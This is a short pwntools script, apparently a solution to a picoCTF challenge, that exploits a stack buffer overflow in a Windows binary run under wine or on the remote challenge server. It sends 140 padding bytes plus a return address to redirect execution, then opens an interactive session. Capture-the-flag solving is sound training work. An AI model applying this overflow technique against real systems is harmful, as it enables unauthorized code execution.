#!/usr/bin/env python3
from pwn import *

PORT =  61778
HOST = "saturn.picoctf.net"
# exe = context.binary = ELF('./vuln.exe', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = process(['wine', 'vuln.exe'])

#GDB()

p.sendline(b"A"*140 + p32(0x00401530))

p.interactive()

